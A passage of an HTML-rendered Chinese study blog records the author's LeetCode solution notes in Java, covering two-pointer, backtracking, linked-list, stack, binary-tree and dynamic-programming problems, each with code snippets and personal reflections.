--third;</span><br><span class="line">            </span><br><span class="line"><span class="number">4.</span>Leetcode定义：这个方法就是我们常说的「双指针」，当我们需要枚举数组中的两个元素时，如果我们发现随着第一个元素的递增，第二个元素是递减的，那么就可以使用双指针的方法，将枚举的时间复杂度从O(N^<span class="number">2</span>)减少至O(N)。本题由于存在第一重循环，双指针复杂度O(N^<span class="number">2</span>)。</span><br><span class="line">    </span><br><span class="line"><span class="number">5.</span>简述：确定第一重循环后，问题简化为双指针问题，移动指针的策略是：由于右指针左移会减小target，即尽可能左移右指针,求得在当前左指针下等于target的位置；当和&lt;target后，将左指针右移使和增大，在新左指针下再继续移动右指针。故Leetcode的<span class="keyword">for</span>循环实现更清晰些。</span><br></pre></td></tr></table></figure><h2 id="17-电话号码的字母组合（8月7日、回溯）"><a href="#17-电话号码的字母组合（8月7日、回溯）" class="headerlink" title="17.电话号码的字母组合（8月7日、回溯）"></a>17.电话号码的字母组合（8月7日、回溯）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>第一次做本题是抱着学习常用api的目的，比如这里的StringBuffer类，能通过：a.append方法添加<span class="type">char</span>类型元素，b.通过deleteCharAt方法实现根据索引删除元素，c.通过toString方法把结果转化为String类。这就能实现一个类似python中“ <span class="string">&quot;&quot;</span>+a ”这样的效果。</span><br><span class="line"><span class="number">2.</span>因为想不通到底要写多少层<span class="keyword">for</span>循环才行，看了题解。题解用了回溯算法，就是递归。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>：通过StringBuffer类创建一个字符缓冲区，每到一层获取一个元素，继续向更深层递进，直到层数达到数字序列的长度，保存结果后开始返回；返回到每一层，先删除本层缓存的元素，再将本层另一元素放入缓冲区，继续向深层递进，直到每层的循环都结束。因为达到最大长度才需要记录结果，故函数不需要思考返回值。</span><br></pre></td></tr></table></figure><h2 id="19-删除链表的倒数第-N-个结点（8月8日、快慢指针）"><a href="#19-删除链表的倒数第-N-个结点（8月8日、快慢指针）" class="headerlink" title="19.删除链表的倒数第 N 个结点（8月8日、快慢指针）"></a>19.删除链表的倒数第 N 个结点（8月8日、快慢指针）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>在对链表进行操作时，一种常用的技巧是添加一个哑节点（dummy node），它的next指针指向链表的头节点。这样一来，我们就不需要对头节点进行特殊的判断了。</span><br><span class="line"><span class="number">2.</span>思路一：先遍历链表获取链表长度，再从头节点开始遍历，遍历到（L-n+<span class="number">1</span>）个节点时，它就是需要删除的节点。以[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],<span class="number">2</span>为例</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;length-n+<span class="number">1</span>;i++)&#123; cur = cur.next;&#125;</span><br><span class="line"><span class="comment">//由于加了dummy节点，先有i再有对应位置node，所以最后到node3结束，i增加为4跳出，恰删除node4</span></span><br><span class="line"><span class="comment">//需要有dummy节点，是假如是以[1],1为例，cur.next会报错，即没有把头节点普通化，放到普通节点的逻辑里。</span></span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：快慢指针，先不做。</span><br></pre></td></tr></table></figure><h2 id="20-有效的括号（8月8日）"><a href="#20-有效的括号（8月8日）" class="headerlink" title="20.有效的括号（8月8日）"></a>20.有效的括号（8月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较简单，就是用栈解决，当(、&#123;、[来时压栈，当)、]、&#125;来时开始判断合法性并弹栈，这个时候栈为空或者栈顶不是对应括号即为非法。此外，通过字符串长度是否为偶数，也能先判断合法性。</span><br><span class="line"><span class="number">2.</span>常用建栈api的掌握：</span><br><span class="line">Deque&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();   <span class="comment">//此时可用stack.peek()，.push(cur)、.pop()等栈方法</span></span><br><span class="line"><span class="number">2.</span>在这里记录史凯超的一个问题：<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();这种为什么要这样写？</span><br><span class="line">  这是对依赖倒置原则：</span><br><span class="line">    a.这样当某位置需要存储list时，它可以设置为接受List从而既存储ArrayList，有存储LinkedList；</span><br><span class="line">    b.list只能使用ArrayList中已经实现了的List接口中的方法，而没有在List接口中定义的方法不能被访问到。</span><br></pre></td></tr></table></figure><h2 id="21-合并两个有序链表-8月8日"><a href="#21-合并两个有序链表-8月8日" class="headerlink" title="21.合并两个有序链表(8月8日)"></a>21.合并两个有序链表(8月8日)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较简单，虽然第一次写，先判断是否为空，又判断大小，代码重复性很大，没有注意可以直接用原链的节点。但是，还使用到了前面学习的dummy节点技巧，这是因为假如<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>在<span class="number">4</span>语句后，就会使得链尾添加一个新节点，此时已跳出循环，结果为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>],考虑去除<span class="number">0</span>的逻辑很麻烦；改进应该是先添加节点，再填充新节点数据，但这样第一个节点直接用了list3tail.next就没被处理，所以应该设一个head的前驱节点dummy，返回dummy.next，这样就能把head节点和后续位置节点一样处理。</span><br><span class="line">    ListNode list3dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">list3tail</span> <span class="operator">=</span> list3dummy;</span><br><span class="line"><span class="keyword">while</span>(tail1!=<span class="literal">null</span>||tail2!=<span class="literal">null</span>)&#123;</span><br><span class="line">    。。。</span><br><span class="line">     <span class="keyword">if</span>(tail1.val&gt;=tail2.val)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();  <span class="comment">//1</span></span><br><span class="line">            list3tail.next = node;           <span class="comment">//2</span></span><br><span class="line">            list3tail = node;                <span class="comment">//3</span></span><br><span class="line">            list3tail.val=tail2.val;         <span class="comment">//4</span></span><br><span class="line">            tail2 = tail2.next;        </span><br><span class="line">   &#125;</span><br><span class="line">        。。。</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">return</span> list3dummy.next;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：递归法，先不做</span><br></pre></td></tr></table></figure><h2 id="22-括号生成（8月11日）"><a href="#22-括号生成（8月11日）" class="headerlink" title="22.括号生成（8月11日）"></a>22.括号生成（8月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是按照<span class="number">20</span>题“有效的括号”那样做，并加上回溯的结构，即新输入满足一定要求后才能回溯。但可能花了<span class="number">2</span>小时写了一泡狗屎，不知道为啥理不清栈在回溯中的表现，明明应该出栈的括号却能剩下来，stack.size()变成了当前字符中左括号的数目，太烧脑了，调试傻了，再做也是浪费时间。TMD,真是超级无比垃圾狗蛋题。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：暴力破解。就是先通过递归生成指定长度的括号，再判断括号字符串是否有效。这里判断括号是否有效的思路比<span class="number">20</span>题简单，因为只判断圆括号<span class="string">&#x27;()&#x27;</span>,只需维护一个循环外<span class="type">int</span>变量balance，当<span class="string">&#x27;(&#x27;</span>来时balance加<span class="number">1</span>，当<span class="string">&#x27;)&#x27;</span>来时balance减<span class="number">1</span>，每轮循环balance小于<span class="number">0</span>说明括号无效，数组遍历完balance为<span class="number">0</span>也说明括号无效，否则有效。这里收获了<span class="type">char</span>[]和String互相转换的API:</span><br><span class="line">String -&gt; <span class="type">char</span>[] : <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line"><span class="type">char</span>[] -&gt; String : <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.valueOf(charArray);</span><br><span class="line">StringBuffer -&gt; String : result.toString()   result为StringBuffer类</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：回溯法。这种方法比较难想，因为只有圆括号<span class="string">&#x27;()&#x27;</span>,添加右括号只需注意，不要在当下超过左括号数目，添加左括号只需不大于n即可。在这种情况下，逻辑变成了，当满足数目条件时才添加括号、递归并回溯，StringBuffer满足长度要求时放入结果。不是最后做判断。</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(List&lt;String&gt; ans,StringBuffer cur,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> max)</span>;</span><br></pre></td></tr></table></figure><h2 id="23-合并K个升序链表（8月12日）"><a href="#23-合并K个升序链表（8月12日）" class="headerlink" title="23.合并K个升序链表（8月12日）"></a>23.合并K个升序链表（8月12日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是，以最左边的数组为curValue，并考虑到链表遍历为空的情况下向右更新curValue。<span class="keyword">for</span>向右遍历数组时，通过<span class="keyword">while</span>遍历数组元素，小于curValue的将被添加到链表，维护两个指针，一个指向链表尾部，一个指向上一次更新curValue的位置，这样就能在curValue左右添加链表节点。当然这个思路最后乱掉了，因为不知道如何描述listFinal的前一个节点。</span><br><span class="line"><span class="number">2.</span>我最初的想法是，维护一个和链表长度相同的数组，记录每个输入链表数组的头指针位置，在每轮中取头指针数组中最小的链表节点，并更新该链表的头指针，直到所有头指针都指向<span class="literal">null</span>。这种想法的问题是如何求最小，最简单的思路是利用具有排序功能的集合，在更新节点放入集合时就排号序，这样就能更容易地实现。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>：使用优先队列。用优先队列实现上一想法，定义Status类实现comparable接口，其中compareTo实现如下：</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Status status2)</span> &#123;<span class="keyword">return</span> <span class="built_in">this</span>.val - status2.val;&#125;</span><br><span class="line">将每个链表数组的头指针按<span class="keyword">new</span> <span class="title class_">Status</span>(node.val, node)放入优先队列，queue.poll()后会弹出最小元素，这样将该最小的头指针后移继续放入queue.offer(<span class="keyword">new</span> <span class="title class_">Status</span>(f.ptr.next.val, f.ptr.next))，最后直到优先队列为空。</span><br></pre></td></tr></table></figure><h2 id="94、二叉树中序遍历（10月6日）"><a href="#94、二叉树中序遍历（10月6日）" class="headerlink" title="94、二叉树中序遍历（10月6日）"></a>94、二叉树中序遍历（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈实现二叉树中序遍历。这是经典代码，带没想到这么快就忘了呜呜呜</span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        Deque&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>||!stack.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            result.add(node.val);</span><br><span class="line">            cur = node.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="101、对称二叉树（10月6日）"><a href="#101、对称二叉树（10月6日）" class="headerlink" title="101、对称二叉树（10月6日）"></a>101、对称二叉树（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。判断二叉树是否对称需要看<span class="number">3</span>点：</span><br><span class="line">a.左树根节点的值 == 右树根节点的值；</span><br><span class="line">b.左树的左子树 和 右树的右子树 对称；</span><br><span class="line">c.左树的右子树 和 右数的左子树 对称；</span><br><span class="line">其中，b和c两点就是递归点，设计比较左子树和右子树的递归函数即可，此外再考虑特殊情况。</span><br></pre></td></tr></table></figure><h2 id="102、二叉树的层序遍历（10月6日）"><a href="#102、二叉树的层序遍历（10月6日）" class="headerlink" title="102、二叉树的层序遍历（10月6日）"></a>102、二叉树的层序遍历（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，我的想法，队列实现二叉树广度优先遍历。这是经典代码，记住要维护每层的长度len即可</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; results = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">while</span>(len&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.pop();</span><br><span class="line">                result.add(node.val);</span><br><span class="line">                len -= <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)</span><br><span class="line">                    queue.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)</span><br><span class="line">                    queue.offer(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            results.add(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="104、二叉树的最大深度（10月6日）"><a href="#104、二叉树的最大深度（10月6日）" class="headerlink" title="104、二叉树的最大深度（10月6日）"></a>104、二叉树的最大深度（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。递归函数设计如下，每个节点和根节点一样，都向左子树和右子树深度优先遍历，并记录当前深度，当遇到左子树或右子树为空时，通过Math.max更新当前最大深度。</span><br><span class="line">     dfs(TreeNode root,<span class="type">int</span>[] maxDeep,<span class="type">int</span> deep)</span><br></pre></td></tr></table></figure><h2 id="105、从前序与中序遍历序列构造二叉树（10月7日）"><a href="#105、从前序与中序遍历序列构造二叉树（10月7日）" class="headerlink" title="105、从前序与中序遍历序列构造二叉树（10月7日）"></a>105、从前序与中序遍历序列构造二叉树（10月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，递归。这道题想起来是很困难的，核心点是，因为题目说明元素不相同，前序遍历首先会访问根节点，再到中序遍历中寻找根节点，则中序遍历根节点左侧为左子树，中序遍历根节点右侧为右子树。如</span><br><span class="line">    前序遍历：[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]    中序遍历：[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>] -&gt; [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="number">0</span> [<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    也可以看到：左子树长度等于 <span class="number">3</span>-<span class="number">0</span>=<span class="number">3</span>，这时候前序遍历左子树索引范围[<span class="number">0</span>+<span class="number">1</span>,<span class="number">0</span>+<span class="number">3</span>]，右子树索引范围为[<span class="number">0</span>+<span class="number">3</span>+<span class="number">1</span>,<span class="number">5</span>]；</span><br><span class="line">    <span class="comment">//表示从ininorder_start开始，不包含inorder_index的串长度</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">preorder_len</span> <span class="operator">=</span> inorder_index - inorder_start;</span><br><span class="line">    <span class="comment">//后面4个int变量，分别是前序、后续遍历的索引起始范围，都是可以渠道的</span></span><br><span class="line">    root.left = dfs(preorder,hashMap,preorder_start+<span class="number">1</span>,preorder_start+preorder_len,inorder_start,inorder_index-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">因为preorder_len是根据中序遍历计算的，不懂，下次再做吧</span><br></pre></td></tr></table></figure><h2 id="121、买卖股票的最佳时机（10月6日）"><a href="#121、买卖股票的最佳时机（10月6日）" class="headerlink" title="121、买卖股票的最佳时机（10月6日）"></a>121、买卖股票的最佳时机（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，左指针。双层<span class="keyword">for</span>循环会超过时间限制，因此维护一个指向当前最小元素的指针。从左到右遍历时，如果当前元素小于左指针指向的元素，就更新左指针；如果当前元素大于左指针指向的元素，就通过Math.max更新最大利润。</span><br></pre></td></tr></table></figure><h2 id="136、只出现一次的数字（10月7日）"><a href="#136、只出现一次的数字（10月7日）" class="headerlink" title="136、只出现一次的数字（10月7日）"></a>136、只出现一次的数字（10月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，HashSet。从左到右遍历数组，如果当前数组元素不在hashSet中，将数组元素放入hashSet；存在则移除该数组元素，最终hashSet仅存的元素就是该数字。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，按位异或。因为其他数字都出现两次，^为异或，a^a=<span class="number">0</span>，<span class="number">0</span>^a=a，</span><br><span class="line">    且异或满足交换律和结合律：a^b^c=(a^b)^c=a^(b^c)=(a^c)^b</span><br><span class="line">    设result初值为<span class="number">0</span>，故从左到右遍历，通过result ^= num更新result，结果只剩唯一值。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，按位累加运算。维护一个大小为<span class="number">32</span>的数组bitNums，表示一个整数的每一位，通过bitNums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;累加得到所有数字的和，再通过<span class="keyword">for</span>(<span class="number">32</span>)中的result = (result&lt;&lt;<span class="number">1</span>)+bitNums[i]%<span class="number">2</span>;得到那唯一的数字；</span><br><span class="line">    bitNums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;    <span class="comment">//仅保留最后一位，因为1的前面位置全为0</span></span><br><span class="line"> result = (result&lt;&lt;<span class="number">1</span>)+bitNums[i]%<span class="number">2</span>;    <span class="comment">//不断左移，在末尾加上低位</span></span><br><span class="line"><span class="number">2.</span>HashSet遍历的两种方式：</span><br><span class="line">    a.迭代器</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();  </span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;  </span><br><span class="line">        System.out.println(iterator.next());              </span><br><span class="line">    &#125;</span><br><span class="line">b.直接遍历</span><br><span class="line">    <span class="keyword">for</span> (String s:set) &#123;  </span><br><span class="line"> System.out.println(s);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="34、在排序数组中查找元素的第一个和最后一个位置（10月8日）"><a href="#34、在排序数组中查找元素的第一个和最后一个位置（10月8日）" class="headerlink" title="34、在排序数组中查找元素的第一个和最后一个位置（10月8日）"></a>34、在排序数组中查找元素的第一个和最后一个位置（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>师爷，翻译翻译，什么叫TMD、TMD非递减？</span><br><span class="line">  好嘞，意思是关键字递增序排列，但是并非单调递增（因为有重复的关键字）从小到大或者允许中间有相等的情形。</span><br><span class="line"><span class="number">2.</span>我的想法，二分查找。由于是递增但是非单调的序列，故能使用二分查找。首先用二分查找确定nums中等于target的一个数的位置，再以该数为起点，确定相同值的最小索引和最大索引。本题从二分查找出发很好想，下面是二分查找经典代码（left、right指针）：</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>,right = nums.length-<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">targetIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left&lt;=right)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid]&lt;target)&#123;</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&gt;target)&#123;</span><br><span class="line">            right = mid-<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            targetIndex = mid;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="49、字母异位词分组（10月8日）"><a href="#49、字母异位词分组（10月8日）" class="headerlink" title="49、字母异位词分组（10月8日）"></a>49、字母异位词分组（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap。这道题以前做过，又忘了。核心是维护一个HashMap&lt;String,List&lt;String&gt;&gt;，key为Arrays.sort(strArray)排序好的字符串，这样“tea”、“ate”、“eat”的key都为“aet”，就能放到value的列表中储存。</span><br></pre></td></tr></table></figure><h2 id="53、最大子数组和（10月8日）"><a href="#53、最大子数组和（10月8日）" class="headerlink" title="53、最大子数组和（10月8日）"></a>53、最大子数组和（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>子序列可以不连续，连续必然是子序列。</span><br><span class="line"><span class="number">2.</span>我的想法，滑动窗口。使用双层<span class="keyword">for</span>循环，外层确定窗口大小len，内层从左到右遍历，并通过Math.max更新窗口的最大sum。但是，这会导致O(n^<span class="number">2</span>)的复杂度，在最后的测试用例上出现超时。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，动态规划。动态规划的关键在于：如何定义状态？（如何定义子问题？）</span><br><span class="line">题解中的思路转变是这样，子问题这样定义：[-<span class="number">2</span>,<span class="number">1</span>,-<span class="number">3</span>,<span class="number">4</span>,-<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">5</span>,<span class="number">4</span>]</span><br><span class="line">    经过-<span class="number">2</span>的连续子数组的最大和是多少？</span><br><span class="line">    经过<span class="number">1</span>的连续子数组的最大和是多少？  ...</span><br><span class="line">但是这样定义，子问题之间很难看出联系，这说明子问题的描述不够准确，转换为：</span><br><span class="line">    以-<span class="number">2</span>结尾的连续子数组的最大和是多少？</span><br><span class="line">    以<span class="number">1</span>结尾的连续子数组的最大和是多少？  ...</span><br><span class="line">这时候子问题就产生了联系，状态转移方程如下：</span><br><span class="line">当dp[i-<span class="number">1</span>]&lt;<span class="number">0</span>时，dp[i]=nums[i];</span><br><span class="line">当dp[i-<span class="number">1</span>]&gt;<span class="number">0</span>时，dp[i] = dp[i-<span class="number">1</span>]+nums[i];</span><br><span class="line">从左到右求解状态转移方程，并找出dp[i]中的最大值，即可解本题。</span><br><span class="line"><span class="number">3.</span>第一次正面认识动态规划，记录两点收获：</span><br><span class="line">    a.动态规划中状态的定义和题目中问题的定义并不相等，求解完状态再分析才能解出题目；</span><br><span class="line">    b.动态规划中子问题（状态）的定义需要有无后效性，后面求解的子问题不再影响前面解出的结果；</span><br></pre></td></tr></table></figure><h2 id="124、二叉树的最大路径和（10月8日）"><a href="#124、二叉树的最大路径和（10月8日）" class="headerlink" title="124、二叉树的最大路径和（10月8日）"></a>124、二叉树的最大路径和（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，深度优先搜索。这道题以前做得很痛苦，这次看到了关键的提示root.val+max(left,right)，还是比较轻松做出来了。对于每个节点，它负责的是：</span><br><span class="line">a.在该节点更新最大值maxValue，考虑：root.val，root.val+left，root.val+right，root.val+left+right四种情况，为了使代码更加优雅，可以用<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> Math.max(<span class="number">0</span>,dfs(root.left,maxSumLeft));</span><br><span class="line">b。向上层返回root.val+max(left,right)；</span><br></pre></td></tr></table></figure><h2 id="300、最长上升子序列（10月8日）"><a href="#300、最长上升子序列（10月8日）" class="headerlink" title="300、最长上升子序列（10月8日）"></a>300、最长上升子序列（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。感觉这种子数组、子序列问题，就要将子问题设置为：</span><br><span class="line"><span class="comment">//状态：以i结尾的最长递增子序列</span></span><br><span class="line">用双层<span class="keyword">for</span>循环做，外层确定当前状态，内层确定[<span class="number">0</span>,当前状态-<span class="number">1</span>]对当前状态的影响，状态转移方程为：</span><br><span class="line">     dp[i] = max(dp[<span class="number">0</span>],dp[<span class="number">1</span>],...,dp[i-<span class="number">1</span>])+<span class="number">1</span>;  <span class="comment">//其中，max中的dp[j]需满足nums[当前]&gt;nums[j]</span></span><br><span class="line">找到最大的dp即为题解。</span><br></pre></td></tr></table></figure><h2 id="347、前K个高频元素（10月8日）"><a href="#347、前K个高频元素（10月8日）" class="headerlink" title="347、前K个高频元素（10月8日）"></a>347、前K个高频元素（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>PriorityQueue默认是最小堆，即Comparator为(e1,e2)-&gt;&#123;e1-e2&#125;，元素按照升序排列；</span><br><span class="line">    如果要降序排列，则比较器的顺序为(e1,e2)-&gt;&#123;e2-e1&#125;，降序排列队列头部为最大值。</span><br><span class="line"><span class="number">2.</span>我的想法，hashMap+PriorityQueue。维护一个hashMap&lt;数字，次数&gt;，将hashMap的键值对放入PriorityQueue根据值维护的最小堆，注意最小堆大小超过k时，要先放入新键值，再剔除堆顶。</span><br><span class="line">    PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;(e1.getValue()-e2.getValue()));</span><br></pre></td></tr></table></figure><h2 id="32、最长有效括号（10月8日）"><a href="#32、最长有效括号（10月8日）" class="headerlink" title="32、最长有效括号（10月8日）"></a>32、最长有效括号（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。设置子问题为，以当前字符结尾的有小括号子串长度。</span><br><span class="line">当前字符为<span class="string">&#x27;(&#x27;</span>时，dp[i]=<span class="number">0</span>；</span><br><span class="line">当前字符为<span class="string">&#x27;)&#x27;</span>时，</span><br><span class="line">    a.如果前一字符为<span class="string">&#x27;(&#x27;</span>则将dp[i]初值设为<span class="number">2</span>，并循环累加<span class="number">2</span>个字符前有效<span class="string">&#x27;)&#x27;</span>的dp；</span><br><span class="line">    b.如果前一字符为<span class="string">&#x27;)&#x27;</span>，则dp[i] = dp[i-<span class="number">1</span>]+<span class="number">2</span>；如果(i-<span class="number">1</span>)的串再加补全<span class="string">&#x27;(&#x27;</span>前还是有效<span class="string">&#x27;)&#x27;</span>,则：</span><br><span class="line">    dp[i] = dp[i-<span class="number">1</span>]+<span class="number">2</span>+dp[i-<span class="number">2</span>-dp[i-<span class="number">1</span>]];</span><br><span class="line">    但是，没有考虑完整情况。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，动态规划。本以为又会耗费很多时间，一看题解发现和我考虑的情况一致，就是我外加了上述的循环累加，修改为<span class="keyword">if</span>即通过。</span><br><span class="line">    Q：为什么循环累加不行？</span><br><span class="line">    A：上面b情况，考虑的是<span class="string">&quot;...))&quot;</span>，靠前面的<span class="string">&#x27;(&#x27;</span>补全当前<span class="string">&#x27;)&#x27;</span>后，如果此前还位有效<span class="string">&#x27;)&#x27;</span>，则应该再加上其dp；</span><br><span class="line">       上面a情况，考虑的是<span class="string">&quot;...()&quot;</span>，写<span class="keyword">while</span>循环考虑的是<span class="string">&quot;...)()&quot;</span>，其中前面的<span class="string">&#x27;)&#x27;</span>有效，应该不断向前循环累加有效<span class="string">&#x27;)&#x27;</span>的dp，但这是不对的，不必要再循环，更前面的有效<span class="string">&#x27;)&#x27;</span>已经在先遇到的<span class="string">&#x27;)&#x27;</span>dp所包含。</span><br><span class="line">    总而言之，非常非常接近答案，但是长时间的思考愈发理不清前面的状态，甚至可以向，dp中本来就不应该有<span class="keyword">while</span>。</span><br><span class="line">    简介，前面为(，再考虑一层；前面为)，再考虑两层。</span><br></pre></td></tr></table></figure><h2 id="206、反转链表（10月8日）"><a href="#206、反转链表（10月8日）" class="headerlink" title="206、反转链表（10月8日）"></a>206、反转链表（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，迭代法三指针。反转链表迭代法，就是要维护pre，cur和after三枚指针，最开始将cur指向head.next，pre指向head，pre.next指向<span class="literal">null</span>，通过以下方式更新链表：</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span 